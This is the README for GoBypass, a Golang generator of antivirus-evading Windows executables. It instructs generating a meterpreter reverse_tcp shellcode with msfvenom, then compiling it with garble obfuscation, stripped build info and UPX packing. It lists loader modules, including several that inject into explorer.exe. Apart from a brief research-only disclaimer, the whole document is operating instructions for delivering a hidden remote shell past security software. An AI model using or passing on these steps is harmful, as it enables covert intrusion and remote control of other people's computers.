# GoBypass

### 免责声明

该工具仅用于安全研究，禁止使用工具发起非法攻击等违法行为，造成的后果使用者负责

### 介绍

`Golang`免杀马生成工具（该工具仅针对`Windows`系统）

不确定免杀效果如何，核心部分借鉴大佬的代码然后自己造轮子

![LOGO](/img/logo.png)

### 准备工作

在`kali`中使用`msfvenom`生成需要的`payload`（注意使用`-f c`参数）

示例：`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -f c`

复制完整C语言格式的`shellcode`并写入当前目录的`shellcode.txt`

（无需过多处理，内部会对ShellCode进行编码）

### 生成免杀马

在生成免杀马之前请注意以下三件事

1. 确保安装`Golang`且环境变量中包含`go`否则无法编译
2. 请在当前目录先执行`go env -w GO111MODULE=on`然后`go mod download`命令下载依赖
3. 如果下载依赖过慢配置镜像`go env -w GOPROXY=https://mirrors.aliyun.com/goproxy`

一切就绪后就可以开始生成了

示例：

1. 使用`CreateThread`模块并删除编译信息：`go run main.go -m CreateThread -d`
2. 删除编译信息且用`garble`混淆源码后编译：`go run main.go -m CreateThread -d -g`
3. 编译后的可执行文件进行`upx`加壳：`go run main.go -m CreateThread -d -g -u`

可选参数如下

| 参数  |                参数说明                 |  参数类型  | 是否必须 |
|:---:|:-----------------------------------:|:------:|:----:|
| -m  |                使用模块                 | string |  是   |
| -s  |    shellcode文件（默认shellcode.txt）     | string |  否   |
| -d  |         使用ldflags -s -w进行编译         |  bool  |  否   |
| -r  |     使用竞态检测器-race进行编译（可能提高免杀效果）      |  bool  |  否   |
| -w  | 隐藏窗口ldflags -H windowsgui（可能降低免杀效果） |  bool  |  否   |
| -u  |           最终生成的exe进行UPX加壳           |  bool  |  否   |
| -g  |        使用garble进行编译（对源码进行混淆）        |  bool  |  否   |
| -h  |               查看帮助信息                |  bool  |  否   |

其中必须的模块参数如下

| 模块名                      | 简介                                              |
|:-------------------------|:------------------------------------------------|
| CreateFiber              | 利用Windows CreateFiber函数                         |
| CreateProcess            | 利用Windows CreateProcess函数在挂起状态下创建进程             |
| CreateRemoteThread       | 远程进程注入ShellCode（注入explorer.exe）                 | 
| CreateRemoteThreadNative | 和上一条区别在于使用更底层的方式（注入explorer.exe）                |
| CreateThread             | 利用Windows CreateThread函数                        |
| CreateThreadNative       | 和上一条区别在于使用更底层的方式                                |
| CryptProtectMemory       | 利用Windows dpapi.h CryptProtectMemory函数          |
| CryptUnprotectMemory     | 利用Windows dpapi.h CryptUnprotectMemory函数        |
| EarlyBird                | 注入的代码在进程主线程的入口点之前运行                             |
| EtwpCreateEtwThread      | 利用Windows EtwpCreateEtwThread函数在进程中执行ShellCode  |
| HeapAlloc                | 创建一个可供调用进程使用的堆并分配内存写入ShellCode                  |
| NtQueueApcThreadEx       | 在当前进程的当前线程中创建一个特殊用户APC来执行ShellCode              |
| RtlCreateUserThread      | 利用Windows RtlCreateUserThread函数（注入explorer.exe） |
| UuidFromStringA          | 利用Windows UuidFromStringA函数                     |

### 参考

尤其感谢`Safe6Sec`师傅的项目

- https://github.com/safe6Sec/GolangBypassAV
- https://github.com/Ne0nd0g/go-shellcode
